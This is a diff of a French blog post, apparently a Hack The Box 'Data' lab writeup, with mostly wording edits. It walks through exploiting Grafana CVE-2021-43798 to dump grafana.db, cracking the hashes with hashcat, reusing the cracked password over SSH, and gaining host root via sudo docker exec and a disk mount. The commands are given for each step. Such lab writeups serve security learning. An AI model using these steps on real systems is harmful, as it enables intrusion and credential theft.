@@ -12,9 +12,9 @@ date: 2026-01-23T16:04:09+01:00
 draft: true
 
 # --- PaperMod / navigation ---
-summary: "Data (HTB Easy) — exploitation pas à pas de Grafana (CVE-2021-43798) jusqu’au root via Docker."
-description: "Writeup de Data (HTB Easy) : énumération, exploitation de Grafana (CVE-2021-43798), extraction de credentials et escalade root via Docker, étape par étape."
-tags: ["HTB Easy", "Web", "Grafana", "Docker"]
+summary: "Data (HTB Easy) : exploitation de Grafana (CVE-2021-43798), récupération d’identifiants et escalade root via Docker."
+description: "Writeup Data (HTB Easy) : énumération, exploitation de Grafana (CVE-2021-43798), récupération d’identifiants et escalade root via Docker expliquées pas à pas."
+tags: ["Easy","grafana","cve-2021-43798","docker","linux-privesc"]
 categories: ["Mes writeups"]
 
 # --- TOC & mise en page ---
@@ -121,14 +121,22 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-Dans ce writeup, tu vas résoudre la machine Data sur Hack The Box (difficulté Easy), avec un walkthrough pas à pas centré sur Grafana. On avance étape par étape : énumération, exploitation de la CVE, récupération d’identifiants, puis escalade via Docker. L’idée n’est pas de lancer un exploit “à l’aveugle”, mais de comprendre ce que tu fais, pour pouvoir réutiliser la méthode sur d’autres machines.
+Dans ce writeup, tu vas résoudre la machine **Data sur Hack The Box (difficulté Easy)** à travers une exploitation centrée sur Grafana. 
+
+On avance étape par étape : énumération, exploitation de la vulnérabilité, récupération d’identifiants, puis escalade via Docker. 
+
+L’objectif n’est pas de lancer un exploit à l’aveugle, mais de comprendre chaque étape afin de pouvoir réutiliser la méthode sur d’autres machines.
 
 Ce que tu vas faire :
 
 - Identifier la surface exposée (SSH + Grafana).
-- Exploiter Grafana (CVE-2021-43798) pour récupérer grafana.db.
+- Exploiter `Grafana` (CVE-2021-43798) pour récupérer `grafana.db`.
 - Craquer le hash et réutiliser les identifiants en SSH.
-- Escalader via sudo docker exec  jusqu’au root de l’hôte.
+- Escalader via `sudo docker exec` jusqu’au root de l’hôte.
+
+Cette machine repose sur une vulnérabilité **Grafana (CVE-2021-43798)** permettant de récupérer la base `grafana.db`.  
+
+Les identifiants extrais sont ensuite réutilisés en **SSH**, puis une mauvaise configuration **Docker** permet d’obtenir un accès **root**.
 
 ---
 
@@ -138,7 +146,7 @@ Ce que tu vas faire :
 
 ### Scan initial
 
-Le scan initial TCP complet (scans_nmap/full_tcp_scan.txt) te révèle les ports ouverts suivants :
+Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) permet d’identifier les ports ouverts suivants :
 
 > Note : les IP et timestamps peuvent varier selon les resets HTB ; l’important ici est la surface exposée.
 
@@ -156,9 +164,9 @@ PORT     STATE SERVICE
 
 ### Scan agressif
 
-Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.
+Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités, ce qui te permet de repérer rapidement les services à examiner en priorité.
 
-Voici le résultat (scans_nmap/aggressive_vuln_scan.txt) :
+Les résultats de cette énumération sont enregistrés dans le fichier `scans_nmap/enum_ftp_smb_scan.txt` :
 
 ```bash
 [+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour data.htb
@@ -197,7 +205,7 @@ OS and Service detection performed. Please report any incorrect results at https
 
 ### Scan ciblé CMS
 
-Vient ensuite le scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`).
+Le script exécute ensuite un scan ciblé CMS (scans_nmap/cms_vuln_scan.txt).
 
 ```bash
 # Nmap 7.98 scan initiated Fri Jan 23 16:09:26 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,3000 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt data.htb
@@ -291,7 +299,7 @@ PORT      STATE         SERVICE
 
 ### Énumération des chemins web
 
-Pour la partie découverte de chemins web, utilise le script dédié {{< script "mon-recoweb" >}}
+Pour la partie découverte de chemins web, tu peux utiliser le script dédié {{< script "mon-recoweb" >}}
 
 ```bash
 mon-recoweb data.htb
@@ -323,11 +331,13 @@ Script: mon-recoweb v2.1.0
 [!] Arrêt du script.
 ```
 
-Ici, mon-recoweb ne renvoie rien car il vérifie d’abord HTTP/HTTPS sur 80/443, et la machine n’expose le web que sur 3000 (Grafana). Dans ce cas, inutile d’insister sur du brute-force : la priorité est d’identifier la version Grafana et les CVE associées.
+Ici, mon-recoweb ne renvoie aucun résultat car le script vérifie d’abord la présence de services HTTP/HTTPS sur les ports 80 et 443. Or, la machine n’expose son interface web que sur le port 3000 (Grafana).
+
+Dans ce cas, inutile d’insister sur du brute-force : la priorité est plutôt d’identifier la version de Grafana et les vulnérabilités associées.
 
 ### Recherche de vhosts
 
-Enfin, teste rapidement la présence de vhosts  avec  le script {{< script "mon-subdomains" >}}
+Enfin, tu peux tester la présence de vhosts à l’aide du script {{< script "mon-subdomains" >}}.
 
 ```bash
 mon-subdomains data.htb
@@ -336,7 +346,7 @@ mon-subdomains data.htb
 #  - scans_subdomains/scan_vhosts.txt
 ```
 
-Si aucun vhost distinct n’est détecté, ce fichier te permet malgré tout de confirmer que le fuzzing n’a rien révélé d’exploitable.
+Même si aucun vhost n’est détecté, ce fichier permet de confirmer que le fuzzing n’a rien révélé d’exploitable.
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/data]
@@ -374,46 +384,49 @@ VHOST totaux : 0
 
 ```
 
+Même en l’absence de réponse sur les ports HTTP standards (80 et 443), le scan des sous-domaines et des virtual hosts est exécuté jusqu’au bout avec `mon-subdomains`.
 
+Cela permet de vérifier explicitement qu’aucun accès web alternatif n’a été oublié.
 
-Même en l’absence de toute réponse sur les ports HTTP standards 80 et 443, le scan des sous-domaines et des virtual hosts est volontairement exécuté jusqu’à son terme à l’aide de `mon-subdomains`. Cette démarche permet de vérifier explicitement qu’aucun accès web alternatif n’a été négligé. Le résultat est sans ambiguïté : aucun vhost ni sous-domaine exploitable n’est identifié. Cette étape valide donc l’exclusion complète de la piste DNS/vhosts et confirme que la surface d’attaque est volontairement restreinte.
+Le résultat est clair : aucun vhost ni sous-domaine exploitable n’est détecté. La surface d’attaque reste donc limitée au service Grafana exposé sur le port 3000.
 
 ---
 
 ## Prise pied
 
-Lorsque tu accèdes à l’interface web Grafana via le port 3000, la page de connexion s’affiche, permettant de confirmer visuellement la version **Grafana v8.0.0** exposée par la machine.
+Lorsque tu accèdes à l’interface web Grafana sur le port 3000, la page de connexion s’affiche et permet de confirmer la version **Grafana v8.0.0** exposée par la machine.
 
 ![Page de login Grafana sur le port 3000 indiquant la version (v8.0.0)](data-htb-http-port-3000-grafana-login-page.png)
 
-En analysant les scans réalisés lors de la phase d’énumération, tu constates qu’un seul service mérite une attention particulière : **Grafana v8.0.0**, accessible via une interface web sur le port 3000.
- C’est donc sur cette application, identifiée comme la surface d’attaque principale, que va se focaliser toute la phase d’exploitation.
+En analysant les scans réalisés lors de la phase d’énumération, tu constates qu’un seul service mérite une attention particulière : **Grafana v8.0.0**, accessible sur le port 3000.
 
-Tu poursuis l’analyse par une recherche ciblée de vulnérabilités connues (**CVE**) affectant **Grafana v8.0.0** (*Grafana 8.0.0 CVE PoC*), qui met en évidence la vulnérabilité critique **CVE-2021-43798**.
+Cette application devient donc la surface d’attaque principale pour la suite de l’exploitation.
 
-Tu identifies ensuite un PoC public pour CVE-2021-43798 (Grafana 8.x path traversal). Tu peux t’appuyer sur le dépôt de [taythebot](https://github.com/taythebot/CVE-2021-43798), parce que les options de dump SQLite sont bien expliquées.
+Tu poursuis l’analyse par une recherche de vulnérabilités connues affectant **Grafana v8.0.0**, ce qui met rapidement en évidence la vulnérabilité critique **CVE-2021-43798**.
+
+Tu identifies ensuite un PoC public pour **CVE-2021-43798** (path traversal Grafana 8.x). Tu peux t’appuyer sur le dépôt de [taythebot](https://github.com/taythebot/CVE-2021-43798), qui documente clairement les options de dump de la base SQLite.
 
 ### Méthode employée
 
-L’exploitation repose sur une succession d’étapes logiques et progressives, telles qu’on les rencontre classiquement dans un **CTF Grafana** :
+L’exploitation repose sur une succession d’étapes logiques et progressives, telles qu’on les rencontre fréquemment dans les machines CTF utilisant Grafana :
 
 1. **Identification du service exposé**
     Tu identifies le service web accessible comme étant **Grafana**, et tu constates que la version déployée est **vulnérable à la CVE-2021-43798**.
 2. **Exploitation de la vulnérabilité de path traversal**
-    Cette vulnérabilité permet une **lecture arbitraire de fichiers** sur le système cible par un mécanisme de **path traversal**, en contournant les restrictions applicatives mises en place par Grafana.
+    Cette vulnérabilité permet une **lecture arbitraire de fichiers** sur le système cible via un mécanisme de **path traversal**, en contournant les restrictions applicatives mises en place par Grafana.
 3. **Accès à la base interne Grafana**
     Tu exploites ensuite cette capacité de lecture pour accéder au fichier `grafana.db`, base **SQLite** interne de Grafana, utilisée pour stocker les données applicatives et les comptes utilisateurs.
 4. **Extraction et exploitation des informations sensibles**
-    L’analyse de la base SQLite te permet d’extraire les **hashes de mots de passe** des utilisateurs Grafana. Ces **password hashes** sont alors attaqués hors-ligne afin d’obtenir des **identifiants réutilisables**, qui servent de point d’entrée pour la poursuite de l’exploitation.
+    L’analyse de la base SQLite permet d’extraire les **hashes de mots de passe** des utilisateurs Grafana. Ces hashes sont ensuite attaqués hors ligne afin d’obtenir des **identifiants réutilisables**, qui serviront de point d’entrée pour la suite de l’exploitation.
 
 ### grafana.db
 
-L’application concrète de la méthode d’exploitation s’effectue selon les étapes techniques suivantes :
+L’exploitation se déroule ensuite selon les étapes techniques suivantes :
 
 1. **Récupération du proof-of-concept**
     Le proof-of-concept associé à la vulnérabilité **CVE-2021-43798** est récupéré depuis le dépôt GitHub de référence. L’exploit est implémenté en **langage Go** et fourni sous la forme d’un fichier `exploit.go`, conçu pour automatiser l’exploitation du path traversal et la lecture de fichiers arbitraires sur une instance Grafana vulnérable.
     
-    Dump sqlite3 database, commande générique :
+    Commande générique pour dumper la base SQLite :
     
     ```bash
     go run exploit.go -target <target> -dump-database
@@ -422,7 +435,7 @@ L’application concrète de la méthode d’exploitation s’effectue selon les
     ​    
 
 2. **Exécution de l’exploit**
-    L’exploit est simplement exécuté conformément aux indications fournies dans le **README du dépôt GitHub**, à l’aide de `go run`, afin de déclencher le **dump de la base de données SQLite** exposée par l’instance Grafana cible.
+    L’exploit est ensuite exécuté conformément aux indications du **README du dépôt GitHub**, à l’aide de `go run`, afin de dumper la base de données SQLite de l’instance Grafana cible.
 
    
 
@@ -448,7 +461,7 @@ L’application concrète de la méthode d’exploitation s’effectue selon les
 > sudo apt update && sudo apt install -y golang-go
 > ```
 >
-> vérification après installation :
+> Vérification après installation :
 >
 > ```bash
 > go version                                                                            
@@ -461,11 +474,11 @@ La base `grafana.db` constitue ensuite le point de départ de l’analyse post-e
 
 ### Exploitation des mots de passe Grafana
 
-Tu analyses la table `user` de la base `grafana.db` à l’aide d’un outil **SQLite** afin d’extraire les champs `password` et `salt`. Ces **hashes Grafana** sont ensuite convertis avec **grafana2hashcat**, puis attaqués hors-ligne à l’aide de **hashcat** pour tenter d’obtenir les mots de passe en clair.
+Tu analyses la table `user` de la base `grafana.db` à l’aide de l’outil `sqlite3` afin d’extraire les champs `password` et `salt`. Ces **hashes Grafana** sont ensuite convertis avec **grafana2hashcat**, puis attaqués hors-ligne à l’aide de **hashcat** pour tenter d’obtenir les mots de passe en clair.
 
-Voici **la chaîne complète de commandes en ligne de commande**, du fichier `grafana.db` jusqu’aux **mots de passe en clair**, dans un enchaînement logique et reproductible.
+Voici la chaîne complète de commandes, depuis le fichier `grafana.db` jusqu’aux mots de passe en clair, dans un enchaînement logique et reproductible.
 
-#### Ouvre la base SQLite et identifier la table `user`
+#### Ouvre la base SQLite et identifie la table `user`
 
 ```bash
 sqlite3 grafana.db
@@ -541,7 +554,7 @@ dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3
 
 #### Télécharge `grafana2hashcat.py`
 
-Depuis ton répertoire de travail :
+Depuis ton répertoire de travail, télécharge le script :
 
 ```bash
 wget https://raw.githubusercontent.com/iamaldi/grafana2hashcat/main/grafana2hashcat.py
@@ -583,7 +596,7 @@ sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIH
 
 #### Associe chaque hash à son utilisateur Grafana
 
-Afin de conserver une correspondance explicite entre chaque hash et son utilisateur, extraits séparément les logins depuis la table `user`, puis associe-les aux hashes convertis dans le même ordre.
+Afin de conserver une correspondance explicite entre chaque hash et son utilisateur, extrais séparément les logins depuis la table `user`, puis associe-les aux hashes convertis dans le même ordre.
 
 ```bash
 sqlite3 -noheader -separator '|' grafana.db \
@@ -710,9 +723,9 @@ cat hashes_with_users.txt
 
 ### Connexion SSH
 
-Tu peux réutiliser les identifiants **`boris:beautiful1`** pour tenter une **connexion SSH**, une situation **fréquente en CTF** où les mots de passe sont souvent partagés entre l’application web et le système.
+Tu peux réutiliser les identifiants **`boris:beautiful1`** pour tenter une **connexion SSH**, une situation fréquente en CTF où les mots de passe sont souvent réutilisés entre l’application web et le système.
 
-Réflexe CTF : dès que tu obtiens un mot de passe via une appli web, teste-le en SSH si le service est ouvert.
+Réflexe CTF : dès que tu récupères un mot de passe via une application web, teste-le en SSH si le service est ouvert.
 
 ```bash
 ssh boris@data.htb
@@ -722,32 +735,13 @@ ssh boris@data.htb
 boris@data.htb's password: 
 Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
-
-  System information as of Tue Jan 27 08:46:04 UTC 2026
-
-  System load:  0.0               Processes:              208
-  Usage of /:   38.0% of 4.78GB   Users logged in:        0
-  Memory usage: 14%               IP address for eth0:    10.129.x.x
-  Swap usage:   0%                IP address for docker0: 172.17.0.1
-
-
-Expanded Security Maintenance for Infrastructure is not enabled.
-
-0 updates can be applied immediately.
-
-122 additional security updates can be applied with ESM Infra.
-Learn more about enabling ESM Infra service for Ubuntu 18.04 at
-https://ubuntu.com/18-04
-
+[...]
 
 Last login: Wed Jun  4 13:37:31 2025 from 10.10.x.x
 boris@data:~$ 
 ```
 
-Une fois connecté en SSH, tu commences par vérifier ton contexte avec les commandes classiques :
+Une fois connecté en SSH, commence par vérifier ton contexte avec les commandes classiques :
 
 ```bash
 whoami
@@ -756,7 +750,7 @@ id
 uid=1001(boris) gid=1001(boris) groups=1001(boris)
 ```
 
-Tu poursuis ensuite par un listing du répertoire courant afin d’identifier rapidement l’environnement et les fichiers accessibles :
+Tu peux ensuite lister le répertoire courant afin d’identifier rapidement l’environnement et les fichiers accessibles :
 
 ```bash
 ls -la
@@ -786,6 +780,7 @@ ad3cxxxxxxxxxxxxxxxxxxxxxxxx0613
 ## Escalade de privilèges
 
 {{< escalade-intro user="boris" >}}
+
 ### Sudo -l
 
 Tu commences toujours par vérifier les droits <code>sudo</code> :
@@ -802,13 +797,15 @@ User boris may run the following commands on localhost:
 
 ```
 
-Ce droit te permet d’exécuter la commande `docker exec` avec les privilèges **root**, sans mot de passe, ce qui signifie que tu peux lancer des commandes à l’intérieur d’un conteneur sans restriction et ouvre, dans un contexte Docker, une voie directe vers une escalade de privilèges nécessitant une analyse approfondie.
+Ce droit permet d’exécuter la commande `docker exec` avec les privilèges **root**, sans mot de passe.  
+
+Dans un contexte Docker, cela peut ouvrir une voie directe vers une escalade de privilèges.
 
 ------
 
 ### Identification du conteneur actif
 
-Tu vas maintenant chercher à identifier les conteneurs Docker actifs sur la machine afin de déterminer lequel peut être exploité pour l’escalade de privilèges.
+Tu cherches maintenant à identifier les conteneurs Docker actifs sur la machine afin de déterminer lequel peut être exploité pour l’escalade de privilèges.
 
 L’accès à la commande `docker ps` n’étant pas autorisé, tu peux identifier les conteneurs Docker actifs directement au niveau des processus système :
 
@@ -824,14 +821,19 @@ root      2917  0.0  0.2  63972  4280 pts/0    S+   10:57   0:00 sudo /snap/bin/
 root      2918  0.0  2.4 1289608 50260 pts/0   Sl+  10:57   0:02 /snap/docker/1125/bin/docker exec --privileged -u 0 -it e6ff5b1cbc85 sh
 ```
 
-En listant les processus liés à Docker, tu identifies un processus `containerd-shim-runc-v2`, ce qui indique qu’un conteneur Docker est actif et te fournit son identifiant via l’option `-id`.
- Les **12 premiers caractères** de cet identifiant (`e6ff5b1cbc85`) suffisent ensuite pour cibler le conteneur et exécuter des commandes à l’intérieur de celui-ci avec `docker exec`.
+En listant les processus liés à Docker, tu identifies un processus `containerd-shim-runc-v2`. Cela indique qu’un conteneur Docker est actif et fournit son identifiant via l’option `-id`.
+
+Les **12 premiers caractères** de cet identifiant (`e6ff5b1cbc85`) suffisent ensuite pour cibler le conteneur et exécuter des commandes avec `docker exec`.
 
 ------
 
 ### Shell root via Docker
 
-L’aide de `docker exec` indique que les options `--privileged` et `--user root` permettent de lancer une commande à l’intérieur du conteneur avec des droits étendus. Dans ce contexte, la commande exécutée sera `/bin/bash` afin d’obtenir un shell root. Une fois ce shell root obtenu, tu disposeras des privilèges nécessaires pour effectuer des opérations système sensibles, comme le montage de partitions, ce qui permettra de monter la partition du système hôte directement dans le conteneur.
+L’aide de `docker exec` indique que les options `--privileged` et `--user root` permettent d’exécuter une commande dans le conteneur avec des droits étendus.
+
+Dans ce contexte, la commande exécutée sera `sh` afin d’obtenir un shell root. 
+
+Une fois ce shell root obtenu, tu disposeras des privilèges nécessaires pour effectuer des opérations système sensibles, comme le montage de partitions, ce qui permettra de monter la partition du système hôte directement dans le conteneur.
 
 ```bash
 sudo /snap/bin/docker exec --privileged -u 0 -it e6ff5b1cbc85 sh
@@ -849,7 +851,8 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 ### Identification des partitions du système hôte
 
 Une fois le shell root obtenu à l’intérieur du conteneur, tu peux identifier les périphériques de stockage exposés par l’hôte.
- La consultation du fichier `/proc/partitions` permet de lister les disques et partitions disponibles :
+
+La consultation du fichier `/proc/partitions` permet de lister les disques et partitions disponibles :
 
 ```bash
 cat /proc/partitions
@@ -881,7 +884,7 @@ sda2
 
 ### Montage de la partition système de l’hôte
 
-Disposant désormais des privilèges nécessaires, tu peux créer un point de montage dans le conteneur et y monter directement la partition système de l’hôte :
+Avec ces privilèges, tu peux créer un point de montage dans le conteneur et y monter directement la partition système de l’hôte :
 
 ```bash
 mkdir -p /mnt/host
@@ -889,7 +892,7 @@ mount /dev/sda1 /mnt/host
 
 ```
 
-Cette opération permet d’accéder au filesystem complet de la machine hôte depuis le conteneur :
+Cette opération permet d’accéder au système de fichiers complet de la machine hôte depuis le conteneur :
 
 ```bash
 ls -la /mnt/host
@@ -950,16 +953,21 @@ Cette étape confirme l’obtention d’un accès **root complet** sur la machin
 
 ## Conclusion
 
-La machine **data.htb** illustre parfaitement un **CTF Easy Hack The Box** centré sur l’exploitation de services web et d’environnements **Docker**. Ce writeup te guide pas à pas depuis l’énumération initiale jusqu’à l’exploitation de **Grafana (CVE-2021-43798)** par path traversal, la récupération de la base `grafana.db`, le **crack hors-ligne des hashes**, puis la **réutilisation des identifiants en SSH**.
+La machine **data.htb** illustre parfaitement un challenge **Hack The Box Easy** combinant exploitation web et mauvaise configuration **Docker**. 
+
+Ce writeup te guide pas à pas depuis l’énumération initiale jusqu’à l’exploitation de **Grafana (CVE-2021-43798)** par path traversal.  
+
+La base `grafana.db` est ensuite récupérée, les **hashes sont craqués hors ligne**, puis les **identifiants sont réutilisés en SSH**.
 
 L’escalade de privilèges repose ensuite sur une mauvaise configuration de **Docker**, permettant via `sudo docker exec` d’obtenir un shell root dans un conteneur et de **monter la partition du système hôte**, conduisant à un **accès root complet**.
 
-**Si tu rencontres d’autres machines utilisant Grafana ou des applications containerisées, garde ce réflexe : un service web vulnérable combiné à un accès Docker mal maîtrisé peut suffire à compromettre entièrement le système.**
+**Si tu rencontres d’autres machines utilisant Grafana ou des applications conteneurisées, garde ce réflexe : un service web vulnérable combiné à un accès Docker mal configuré peut suffire à compromettre entièrement le système.**
 
 **En résumé**
 
 Writeup **data.htb (HTB Easy)** axé sur l’exploitation de **Grafana (CVE-2021-43798)** : path traversal, extraction de `grafana.db`, **crack des hashes**, réutilisation des identifiants en **SSH**, puis **escalade root via Docker** (`sudo docker exec` et montage du disque hôte).
- Une méthodologie simple et reproductible montrant comment un **service web vulnérable**, associé à une **mauvaise isolation Docker**, peut mener à un **accès root complet**.
+
+Une méthodologie simple et reproductible montrant comment un **service web vulnérable**, associé à une **mauvaise configuration Docker**, peut mener à un **accès root complet**.
 
 ---
 
